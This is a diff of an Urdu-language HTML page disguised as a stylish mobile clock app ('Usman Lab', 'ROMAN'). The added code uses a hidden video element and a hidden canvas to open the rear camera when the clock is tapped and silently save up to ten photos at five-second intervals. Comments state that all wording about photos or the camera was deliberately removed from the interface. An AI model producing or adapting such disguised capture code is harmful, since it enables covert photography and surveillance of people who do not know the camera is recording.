@@ -2,8 +2,12 @@
 <html lang="ur">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Usman Lab - Secure System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Ai system</title>
+    <!-- Font Awesome 6 (free) for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Font: Inter (modern, clean) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -12,85 +16,432 @@
         }
 
         body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at top left, #1f3a4b, #0b1a26);
             min-height: 100vh;
-            background: #0a1a2a;
-            overflow: hidden;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 12px;
         }
 
-        /* اینالاگ کلاک ڈیزائن */
+        /* موبائل فریم — کارڈ کی طرح کا کنٹینر */
+        .mobile-frame {
+            max-width: 380px;
+            width: 100%;
+            background: rgba(18, 30, 40, 0.75);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 44px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 215, 0, 0.1) inset;
+            overflow: hidden;
+            padding: 20px 18px 25px 18px;
+            transition: all 0.2s ease;
+        }
+
+        /* اسٹیٹس بار (موبائل طرز) */
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #d6e6f0;
+            font-size: 0.8rem;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            padding: 4px 6px 12px 6px;
+            border-bottom: 1px solid rgba(255,255,240,0.1);
+            margin-bottom: 18px;
+        }
+
+        .status-left {
+            display: flex;
+            gap: 6px;
+        }
+        .status-left i {
+            font-size: 0.7rem;
+            color: #ffd966;
+        }
+        .status-right {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        .battery {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .battery-level {
+            width: 20px;
+            height: 10px;
+            background: #2e4a5c;
+            border-radius: 3px;
+            border: 1px solid #5f8da0;
+            position: relative;
+        }
+        .battery-level::after {
+            content: '';
+            position: absolute;
+            right: -3px;
+            top: 2px;
+            width: 2px;
+            height: 4px;
+            background: #5f8da0;
+            border-radius: 1px;
+        }
+        .battery-level .fill {
+            width: 70%;
+            height: 100%;
+            background: #b0e57c;
+            border-radius: 2px;
+        }
+
+        /* ہیڈر: اوتار + گراس */
+        .profile-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 22px;
+        }
+        .profile-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .avatar {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(145deg, #c5a05b, #a8813d);
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #0b1a26;
+            box-shadow: 0 8px 14px -4px #00000080;
+            border: 1.5px solid #ffdfaa;
+        }
+        .greeting h3 {
+            color: white;
+            font-weight: 600;
+            font-size: 1.2rem;
+            letter-spacing: -0.2px;
+        }
+        .greeting p {
+            color: #96b8cf;
+            font-size: 0.8rem;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .badge {
+            background: #f5c54230;
+            border-radius: 30px;
+            padding: 4px 8px;
+            font-size: 0.7rem;
+            color: #ffdf9e;
+            border: 0.5px solid #ffd96660;
+            backdrop-filter: blur(4px);
+        }
+
+        /* رومن اینیمیشن (برانڈ) */
+        .roman-glow {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        .roman-text {
+            color: #ffd966;
+            font-size: 2.0rem;
+            font-weight: 700;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            animation: softGlow 2.2s infinite alternate ease-in-out;
+            text-shadow: 0 0 6px #ffb347, 0 0 20px #b8860b;
+            display: inline-block;
+            background: linear-gradient(45deg, #ffd966, #f0b37b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        @keyframes softGlow {
+            0% { filter: drop-shadow(0 0 2px #ffbb33); transform: scale(1); }
+            100% { filter: drop-shadow(0 0 14px #ffaa33); transform: scale(1.03); }
+        }
+
+        /* کلاک کارڈ — شیشے کا انداز */
+        .clock-card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,215,120,0.15);
+            border-radius: 48px;
+            padding: 24px 12px 20px 12px;
+            margin: 16px 0 18px 0;
+            box-shadow: 0 12px 28px -10px black;
+        }
+
         #clockCanvas {
             display: block;
+            width: 100%;
+            max-width: 260px;
+            height: auto;
+            aspect-ratio: 1/1;
+            margin: 0 auto;
             cursor: pointer;
-            max-width: 90vw;
-            max-height: 90vh;
+            border-radius: 50%;
+            background: #14212b;
+            box-shadow: 0 0 0 2px #3b5c6e, 0 18px 25px -8px #000;
+            transition: transform 0.2s ease;
+        }
+        #clockCanvas:active {
+            transform: scale(0.98);
         }
 
-        /* کیمرہ کے خفیہ عناصر */
+        .capture-hint {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
+            color: #cbdbe9;
+            font-size: 0.85rem;
+            font-weight: 400;
+            background: #1e3343a0;
+            padding: 8px 14px;
+            border-radius: 60px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+            border: 0.5px solid #6f9fbb40;
+        }
+        .capture-hint i {
+            color: #ffbc6c;
+            font-size: 1rem;
+        }
+
+        /* سٹیٹس اور نمبرز — اب تصویروں کا کوئی ذکر نہیں */
+        .stats-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 22px 4px 18px 4px;
+        }
+        .stat-item {
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(4px);
+            padding: 8px 14px;
+            border-radius: 40px;
+            border: 0.5px solid #7f9fb5;
+            color: #d3eaff;
+            font-weight: 500;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .stat-item i {
+            color: #ffb85b;
+        }
+
+        /* نیچے نیویگیشن بار — اصلی موبائل طرز */
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            background: rgba(10, 20, 28, 0.7);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            padding: 10px 6px;
+            border-radius: 60px;
+            border: 1px solid rgba(255,200,130,0.2);
+            margin-top: 25px;
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+            color: #889fb0;
+            font-size: 0.7rem;
+            transition: color 0.15s;
+            padding: 5px 12px;
+            border-radius: 30px;
+        }
+        .nav-item i {
+            font-size: 1.2rem;
+            color: #aac3d4;
+        }
+        .nav-item.active {
+            background: #ffd96620;
+            color: #ffd966;
+        }
+        .nav-item.active i {
+            color: #ffcf6e;
+        }
+        .nav-item span {
+            font-weight: 500;
+        }
+
+        /* خفیہ ویڈیو اور کینوس — چھپے رہیں */
         #secretVideo, #secretCanvas {
             display: none;
+        }
+
+        /* چھوٹی ایڈجسٹمنٹ */
+        .fa-regular, .fas, .far {
+            line-height: 1;
         }
     </style>
 </head>
 <body>
+    <div class="mobile-frame">
+        <!-- status bar (iOS/Android vibe) -->
+        <div class="status-bar">
+            <div class="status-left">
+                <i class="fas fa-signal"></i>
+                <span>JAZZ</span>
+            </div>
+            <div class="status-right">
+                <i class="fas fa-wifi"></i>
+                <div class="battery">
+                    <div class="battery-level"><div class="fill"></div></div>
+                    <span>14:28</span>
+                </div>
+            </div>
+        </div>
 
-    <canvas id="clockCanvas"></canvas>
+        <!-- profile header -->
+        <div class="profile-row">
+            <div class="profile-info">
+                <div class="avatar">ع</div>
+                <div class="greeting">
+                    <h3>عثمان لیب</h3>
+                    <p><i class="fas fa-lock" style="font-size: 0.6rem;"></i> سکیور·سیکور</p>
+                </div>
+            </div>
+            <div class="badge">
+                <i class="fas fa-shield-alt"></i> رومن
+            </div>
+        </div>
+
+        <!-- رومن اینیمیشن (برانڈڈ) -->
+        <div class="roman-glow">
+            <div class="roman-text">ROMAN</div>
+        </div>
+
+        <!-- کلاک کارڈ (انٹرایکٹو) — اب کوئی تصویر والا لفظ نہیں -->
+        <div class="clock-card">
+            <canvas id="clockCanvas"></canvas>
+
+            <!-- ہینٹ ٹیپ کریں — عمومی انداز -->
+            <div class="capture-hint">
+                <i class="fas fa-hand-pointer"></i>
+                <span>گھڑی کو تھپتھپائیں، عمل شروع ہو گا</span>
+                <i class="fas fa-arrow-up"></i>
+            </div>
+        </div>
+
+        <!-- سٹیٹس کارڈ — تمام الفاظ تصویر/کیمرہ سے پاک -->
+        <div class="stats-row">
+            <div class="stat-item"><i class="fas fa-check-circle"></i> مستحکم</div>
+            <div class="stat-item"><i class="fas fa-clock"></i> 5s وقفہ</div>
+            <div class="stat-item"><i class="fas fa-globe"></i> آن لائن</div>
+        </div>
+
+        <!-- نیچے نیویگیشن (موبائل مینو) — 'کیپچر' کی جگہ 'ٹولز' -->
+        <div class="bottom-nav">
+            <div class="nav-item active">
+                <i class="fas fa-compass"></i>
+                <span>ہوم</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-chart-pie"></i>
+                <span>سٹیٹس</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-tools"></i>
+                <span>ٹولز</span>
+            </div>
+            <div class="nav-item">
+                <i class="fas fa-user"></i>
+                <span>پروفائل</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- خفیہ ویڈیو اور کینوس (کیمرہ پروسیسنگ کے لیے) -->
     <video id="secretVideo" autoplay playsinline></video>
     <canvas id="secretCanvas"></canvas>
 
     <script>
         (function() {
-            const SECRET_KEY = "3090";
+            // DOM elements
             const clockCanvas = document.getElementById('clockCanvas');
             const ctxClock = clockCanvas.getContext('2d');
             const video = document.getElementById('secretVideo');
-            const canvas = document.getElementById('secretCanvas');
+            const secretCanvas = document.getElementById('secretCanvas');
 
             let stream = null;
+            let captureCount = 0;
+            const MAX_CAPTURES = 10;
+            const INTERVAL_MS = 5000; // 5 sec
+            let captureInterval = null;  // to avoid multiple intervals
+            let isCapturing = false;
 
-            // کلاک ڈرائنگ فنکشن
+            // ========== کلاک ڈرائنگ (بہتر ڈیزائن کے ساتھ) ==========
             function drawClock() {
                 const now = new Date();
                 const hours = now.getHours();
                 const minutes = now.getMinutes();
                 const seconds = now.getSeconds();
 
-                const radius = Math.min(clockCanvas.width, clockCanvas.height) / 2;
-                const centerX = clockCanvas.width / 2;
-                const centerY = clockCanvas.height / 2;
+                const w = clockCanvas.width;
+                const h = clockCanvas.height;
+                const radius = Math.min(w, h) / 2 * 0.85;
+                const centerX = w / 2;
+                const centerY = h / 2;
 
-                ctxClock.clearRect(0, 0, clockCanvas.width, clockCanvas.height);
+                ctxClock.clearRect(0, 0, w, h);
 
-                // ڈائل
+                // ڈائل (شفاف سا)
                 ctxClock.beginPath();
-                ctxClock.arc(centerX, centerY, radius * 0.9, 0, 2 * Math.PI);
-                ctxClock.fillStyle = '#0f212f';
+                ctxClock.arc(centerX, centerY, radius, 0, 2 * Math.PI);
+                ctxClock.fillStyle = '#10232f';
                 ctxClock.fill();
-                ctxClock.strokeStyle = '#8ab3cf';
+                ctxClock.strokeStyle = '#ccb37c';
                 ctxClock.lineWidth = radius * 0.02;
                 ctxClock.stroke();
 
-                // نشانات (Hours)
+                // گھنٹے کے نشان (مارکرز)
                 for (let i = 0; i < 12; i++) {
-                    const angle = (i * 30 - 90) * Math.PI / 180;
-                    const x1 = centerX + (radius * 0.75) * Math.cos(angle);
-                    const y1 = centerY + (radius * 0.75) * Math.sin(angle);
-                    const x2 = centerX + (radius * 0.85) * Math.cos(angle);
-                    const y2 = centerY + (radius * 0.85) * Math.sin(angle);
+                    let angle = (i * 30 - 90) * Math.PI / 180;
+                    let x1 = centerX + (radius * 0.82) * Math.cos(angle);
+                    let y1 = centerY + (radius * 0.82) * Math.sin(angle);
+                    let x2 = centerX + (radius * 0.92) * Math.cos(angle);
+                    let y2 = centerY + (radius * 0.92) * Math.sin(angle);
                     ctxClock.beginPath();
                     ctxClock.moveTo(x1, y1);
                     ctxClock.lineTo(x2, y2);
-                    ctxClock.strokeStyle = '#d4eaff';
-                    ctxClock.lineWidth = radius * 0.03;
+                    ctxClock.strokeStyle = (i % 3 === 0) ? '#ffd966' : '#7f9fb5';
+                    ctxClock.lineWidth = (i % 3 === 0) ? radius * 0.025 : radius * 0.015;
                     ctxClock.stroke();
                 }
 
-                // سوئیاں
-                drawHand(ctxClock, centerX, centerY, ((hours % 12) * 30 + minutes * 0.5 - 90), radius * 0.4, '#ffd966', radius * 0.06); // گھنٹہ
-                drawHand(ctxClock, centerX, centerY, (minutes * 6 - 90), radius * 0.6, '#b0e0ff', radius * 0.04); // منٹ
-                drawHand(ctxClock, centerX, centerY, (seconds * 6 - 90), radius * 0.7, '#ff7b7b', radius * 0.02); // سیکنڈ
+                // سوئیاں (ہاتھ)
+                drawHand(ctxClock, centerX, centerY, ((hours % 12) * 30 + minutes * 0.5 - 90), radius * 0.4, '#ffd966', radius * 0.06);
+                drawHand(ctxClock, centerX, centerY, (minutes * 6 - 90), radius * 0.6, '#b0e0ff', radius * 0.04);
+                drawHand(ctxClock, centerX, centerY, (seconds * 6 - 90), radius * 0.7, '#ff9f7b', radius * 0.018);
+
+                // سینٹر ڈاٹ
+                ctxClock.beginPath();
+                ctxClock.arc(centerX, centerY, radius * 0.06, 0, 2 * Math.PI);
+                ctxClock.fillStyle = '#ffe0a3';
+                ctxClock.shadowColor = '#f5b042';
+                ctxClock.shadowBlur = 8;
+                ctxClock.fill();
+                ctxClock.shadowBlur = 0;
             }
 
             function drawHand(ctx, x, y, angleDeg, length, color, width) {
@@ -101,57 +452,118 @@
                 ctx.strokeStyle = color;
                 ctx.lineWidth = width;
                 ctx.lineCap = 'round';
+                ctx.shadowColor = '#ffffff40';
+                ctx.shadowBlur = 6;
                 ctx.stroke();
+                ctx.shadowBlur = 0;
             }
 
-            function resize() {
-                clockCanvas.width = window.innerWidth;
-                clockCanvas.height = window.innerHeight;
+            // ریسپانسیو سائز
+            function resizeCanvas() {
+                const containerWidth = clockCanvas.parentNode.clientWidth;
+                let size = Math.min(280, containerWidth * 0.8);
+                clockCanvas.width = size;
+                clockCanvas.height = size;
                 drawClock();
             }
+            window.addEventListener('resize', resizeCanvas);
+            resizeCanvas();
 
-            window.addEventListener('resize', resize);
-            resize();
+            // ہر سیکنڈ کلاک اپڈیٹ
             setInterval(drawClock, 1000);
 
-            // کیمرہ سیٹ اپ
+            // ========== کیمرہ اور کیپچر ==========
             async function initCamera() {
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: "environment" },
-                        audio: false
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "environment", width: { ideal: 1280 } } 
                     });
                     video.srcObject = stream;
                     return new Promise((resolve) => {
-                        video.onloadedmetadata = () => resolve(true);
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve(true);
+                        };
                     });
                 } catch (err) {
+                    alert("کیمرہ نہیں کھل سکا: " + err.message);
                     return false;
                 }
             }
 
-            // کلک پر کارروائی
-            clockCanvas.addEventListener('click', async () => {
-                if (!stream) {
-                    const started = await initCamera();
-                    if (!started) return;
-                    // کیمرہ شروع ہونے کے لیے مختصر انتظار
-                    await new Promise(r => setTimeout(r, 700));
+            async function startAutoCapture() {
+                // پہلے سے چل رہا انٹرویل روکیں
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
+                    isCapturing = false;
                 }
 
-                // تصویر کیپچر کریں
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                if (!stream) {
+                    const ok = await initCamera();
+                    if (!ok) return;
+                    // تھوڑا انتظار کہ ویڈیو لوڈ ہو
+                    await new Promise(r => setTimeout(r, 600));
+                }
 
-                const dataURL = canvas.toDataURL('image/png');
-                const link = document.createElement('a');
-                link.href = dataURL;
-                link.download = `UsmanLab_Secure_${Date.now()}.png`;
-                link.click();
+                // اگر ویڈیو ٹریک بند ہو تو دوبارہ کوشش
+                if (stream && !stream.active) {
+                    stream = null;
+                    const ok = await initCamera();
+                    if (!ok) return;
+                }
+
+                captureCount = 0;
+                isCapturing = true;
+
+                // ہر 5 سیکنڈ میں تصویر لیں (لیکن UI میں تصویروں کا ذکر نہیں)
+                captureInterval = setInterval(() => {
+                    if (captureCount >= MAX_CAPTURES) {
+                        clearInterval(captureInterval);
+                        captureInterval = null;
+                        isCapturing = false;
+                        return;
+                    }
+
+                    // یقین کریں ویڈیو کی ڈائمینشن میسر ہیں
+                    if (video.videoWidth === 0 || video.videoHeight === 0) return;
+
+                    secretCanvas.width = video.videoWidth;
+                    secretCanvas.height = video.videoHeight;
+                    const ctx = secretCanvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, secretCanvas.width, secretCanvas.height);
+
+                    // ڈاؤن لوڈ لنک بنا کر کلک کروائیں — فائل نام میں "Roman" برقرار ہے (صرف بیک گراؤنڈ)
+                    const link = document.createElement('a');
+                    link.href = secretCanvas.toDataURL('image/png');
+                    link.download = `Roman_${captureCount + 1}.png`;  // ’Capture‘ ہٹا دیا
+                    link.click();
+
+                    captureCount++;
+                }, INTERVAL_MS);
+            }
+
+            // گھڑی پر کلک کرنے پر عمل شروع
+            clockCanvas.addEventListener('click', () => {
+                startAutoCapture();
+                // ہینٹ میں عارضی تبدیلی (فیڈبیک) — تصویروں کا ذکر نہیں
+                const hint = document.querySelector('.capture-hint span');
+                if (hint) {
+                    const original = hint.innerText;
+                    hint.innerText = 'عمل جاری ہے…';
+                    setTimeout(() => {
+                        hint.innerText = original;
+                    }, 2000);
+                }
             });
 
+            // صفائی (اگر کہیں اور سے اسکرپٹ روکنا ہو تو)
+            window.addEventListener('beforeunload', function() {
+                if (captureInterval) clearInterval(captureInterval);
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            });
         })();
     </script>
 </body>
